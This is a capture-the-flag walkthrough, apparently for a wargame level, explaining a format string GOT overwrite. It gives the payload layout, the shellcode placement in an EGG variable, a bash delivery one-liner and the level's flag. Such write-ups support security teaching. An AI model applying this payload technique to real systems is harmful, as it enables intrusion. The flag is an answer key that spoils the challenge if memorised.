@@ -1,0 +1,73 @@
+# Level 05 Walkthrough - Format String GOT Overwrite
+
+## Binary Overview
+
+```
+main():
+  fgets(buf, 100, stdin)
+  for each char in buf:
+    if 0x41 <= c <= 0x5a: c ^= 0x20  (uppercase -> lowercase)
+  printf(buf)   <- FORMAT STRING VULNERABILITY
+  exit(0)
+```
+
+## Constraints
+
+- **Uppercase bytes 0x41–0x5a** in the input are lowercased (XOR 0x20) — affects embedded addresses
+- **fgets** stops at newline (0x0a) — shellcode in EGG env var avoids this restriction
+- **No ASLR** — all addresses are fixed
+- **Executable stack** — shellcode runs in env var region
+
+## Exploit Strategy
+
+### 1. Shellcode in EGG Env Var
+
+Same open/read/write shellcode as level04 (74 bytes, no 0x0a), targeting `/home/users/level06/.pass`. Placed after 200-byte NOP sled:
+
+```
+EGG = "\x90" * 200 + shellcode   (274 bytes)
+```
+
+EGG address in the `bash -c 'printf ... | ./level05'` context: **`0xffffddc5`**
+
+Return target = `0xffffddc5 + 100 = 0xffffde29` (middle of NOP sled)
+
+### 2. Format String GOT Overwrite
+
+**Target**: `exit@got = 0x080497e0` — overwrite with `0xffffde29` (EGG+100)
+
+Buffer is at **vararg position 10** (confirmed via `%p` leak).
+
+Format string layout (38 bytes, all safe from uppercase conversion):
+
+```
+\xe0\x97\x04\x08   <- exit@got low word addr  (position 10)
+\xe2\x97\x04\x08   <- exit@got high word addr (position 11)
+%10$056865d        <- emit 56865 chars (total = 8+56865 = 56873 = 0xde29)
+%10$hn             <- write 0xde29 to exit@got[0:2]
+%11$08662d         <- emit 8662 more chars (total = 65535 = 0xffff)
+%11$hn             <- write 0xffff to exit@got[2:4]
+```
+
+Result: `exit@got = 0xffffde29` -> jumps to NOP sled -> shellcode
+
+### 3. Delivery
+
+```bash
+EGG=$'<nop+shellcode>' bash -c 'printf "<format_string>" | ./level05'
+```
+
+`printf` outputs ~65KB of padding; the password is appended at the very end by the shellcode's `write(1, ...)` syscall.
+
+## Address Summary
+
+| Symbol        | Address      |
+|---------------|--------------|
+| exit@got      | 0x080497e0   |
+| libc base     | 0xf7e4e000   |
+| EGG (NOP+SC)  | 0xffffddc5   |
+| Return addr   | 0xffffde29   |
+
+## Flag
+
+`h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq`
